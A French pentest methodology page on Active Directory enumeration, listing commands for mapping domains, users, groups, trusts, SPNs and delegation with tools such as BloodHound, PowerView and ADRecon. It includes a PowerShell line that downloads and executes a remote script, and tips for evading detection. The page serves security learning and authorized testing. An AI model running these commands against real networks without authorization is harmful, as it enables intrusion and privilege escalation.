# Active Directory Enumeration

## 🗂️ Workflow d'énumération Active Directory
1. Identification du domaine et des contrôleurs (nltest, nslookup)
   ↓
2. Enumération des utilisateurs et groupes (net user /domain, PowerView)
   ↓
3. Enumération des ordinateurs et services (net computers, Get-ADComputer)
   ↓
4. Enumération des GPO et ACL (gpresult, Get-GPO, BloodHound)
   ↓
5. Enumération des trusts et relations (nltest, Get-ADTrust)
   ↓
6. Recherche de failles et mauvaises configurations
   ↓
7. Cartographie des privilèges et chemins d'attaque (BloodHound)

## 📋 Vue d'ensemble

Active Directory est le service d'annuaire de Microsoft qui centralise l'authentification et l'autorisation dans les environnements Windows d'entreprise. Son énumération révèle souvent des chemins privilégiés d'escalade et de mouvement latéral.

> **💡 Explication Simple** : AD c'est comme l'organigramme géant d'une entreprise avec tous les employés, leurs droits, leurs relations. En le fouillant, on peut trouver qui a accès à quoi et comment devenir administrateur.

## 🔍 Phase 1 : Découverte du Domaine

### Identification du domaine
```batch
# Informations sur le domaine actuel
nltest /domain_trusts
net config workstation
echo %USERDOMAIN%
echo %LOGONSERVER%

# Contrôleurs de domaine
nslookup -type=srv _ldap._tcp.dc._msdcs.%USERDOMAIN%
nltest /dclist:%USERDOMAIN%

# Informations détaillées du domaine
net accounts /domain
```

### Structure du domaine
```powershell
# Avec PowerShell (si disponible)
Get-ADDomain
Get-ADForest
Get-ADDomainController

# Informations DNS du domaine
nslookup %USERDOMAIN%
nslookup -type=any %USERDOMAIN%
```

## 👥 Phase 2 : Énumération Utilisateurs et Groupes

### Utilisateurs du domaine
```batch
# Tous les utilisateurs du domaine
net user /domain

# Détails d'un utilisateur spécifique
net user username /domain

# Utilisateurs avec des privilèges élevés
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Schema Admins" /domain
net group "Administrators" /domain
```

### Groupes du domaine
```batch
# Tous les groupes
net group /domain

# Groupes critiques
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Account Operators" /domain
net group "Backup Operators" /domain
net group "Print Operators" /domain
net group "Server Operators" /domain
```

### Énumération PowerShell/LDAP
```powershell
# Import des modules AD
Import-Module ActiveDirectory

# Tous les utilisateurs avec propriétés
Get-ADUser -Filter * -Properties *

# Utilisateurs avec SPN (Service Principal Names)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Recherche d'utilisateurs inactifs
Search-ADAccount -AccountInactive -TimeSpan 90.00:00:00 -UsersOnly

# Utilisateurs avec mot de passe non-expirant
Get-ADUser -Filter {PasswordNeverExpires -eq $true}
```

## 💻 Phase 3 : Énumération des Ordinateurs

### Machines du domaine
```batch
# Ordinateurs du domaine
net group "Domain Computers" /domain

# Avec PowerShell
Get-ADComputer -Filter *
Get-ADComputer -Filter * -Properties OperatingSystem
```

### Services et SPNs
```batch
# Service Principal Names
setspn -Q */*

# Services par machine
setspn -L computername
```

## 🏢 Phase 4 : GPO et Politiques

### Group Policy Objects
```batch
# Politiques appliquées
gpresult /r
gpresult /z

# Avec PowerShell
Get-GPO -All
Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Temp\rsop.html
```

### Scripts de connexion
```batch
# Scripts de logon
net accounts /domain

# Dossiers SYSVOL et NETLOGON
dir \\%USERDOMAIN%\SYSVOL
dir \\%USERDOMAIN%\NETLOGON
```

## 🔗 Phase 5 : Trusts et Relations

### Relations de confiance
```batch
# Trusts du domaine
nltest /domain_trusts
nltest /trusted_domains

# Avec PowerShell
Get-ADTrust -Filter *
```

## 🩸 Outils d'Énumération Avancée

### BloodHound
```powershell
# Collecteur BloodHound
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain DOMAIN.LOCAL -ZipFileName bloodhound.zip

# Ou avec l'exécutable
.\SharpHound.exe -c All -d DOMAIN.LOCAL
```

### PowerView (PowerSploit)
```powershell
# Import PowerView
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')

# Énumération complète
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
Get-NetSession
Get-NetLoggedon
Get-NetShare

# Recherche de chemins vers Domain Admins
Find-DomainUserLocation
Find-DomainProcess
Find-InterestingDomainAcl
```

### ADRecon
```powershell
# Énumération complète avec ADRecon
.\ADRecon.ps1 -DomainController DC01.domain.local -Credential domain\user
```

### ldapsearch (Linux)
```bash
# Énumération LDAP depuis Linux
ldapsearch -x -H ldap://DC_IP -D "domain\user" -W -b "dc=domain,dc=local"

# Tous les utilisateurs
ldapsearch -x -H ldap://DC_IP -D "domain\user" -W -b "dc=domain,dc=local" "(objectClass=user)"

# Tous les ordinateurs
ldapsearch -x -H ldap://DC_IP -D "domain\user" -W -b "dc=domain,dc=local" "(objectClass=computer)"
```

## 🔐 Recherche de Vulnérabilités

### Comptes de service
```powershell
# Kerberoasting - Comptes avec SPN
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname

# ASREPRoasting - Comptes sans pré-auth Kerberos
Get-DomainUser -PreauthNotRequired
```

### Permissions dangereuses
```powershell
# ACL intéressantes
Find-InterestingDomainAcl -ResolveGUIDs

# Délégation non contrainte
Get-NetComputer -UnconstrainedDelegation

# Délégation contrainte
Get-NetComputer -TrustedToAuth
```

### Mots de passe faibles
```powershell
# Recherche de mots de passe par défaut ou faibles
# (nécessite des credentials valides)
```

## 🛡️ Conseils OPSEC
- Privilégier les requêtes LDAP natives aux outils tiers détectables
- Ne jamais modifier les objets AD sans autorisation explicite
- Éviter les collectes BloodHound trop fréquentes (détectables)
- Utiliser des comptes à privilèges limités pour l'énumération
- Fragmenter les requêtes pour éviter la détection

## ⚠️ Erreurs fréquentes
- Oublier de vérifier les trusts et relations inter-domaines
- Négliger les GPO et les scripts de logon (source de credentials)
- Lancer des outils trop bruyants (BloodHound complet sur prod)
- Ne pas sauvegarder les données collectées pour analyse offline
- Ignorer les délégations et les ACL personnalisées

## 💡 Astuces
- Utiliser BloodHound pour visualiser les chemins d'attaque complexes
- Croiser les résultats PowerView, ADRecon et requêtes LDAP manuelles
- Chercher des credentials dans SYSVOL et les scripts GPO
- Vérifier les comptes de service pour Kerberoasting
- Analyser les délégations pour les attaques de rebond

## 🔗 Pour aller plus loin
- [PayloadsAllTheThings - Active Directory](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/Active%20Directory%20Attack%20Methodology)
- [HackTricks - Active Directory](https://book.hacktricks.xyz/windows/active-directory-methodology)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
- [ADRecon](https://github.com/adrecon/ADRecon)

## 🧭 Navigation
- [Énumération Linux](./Linux_Enumeration.md)
- [Énumération Windows](./Windows_Enumeration.md)
- [Outils d'énumération](../Tools-Enumeration/)
- [Retour à la méthodologie générale](../Guide-Enumeration-Pentest.md) 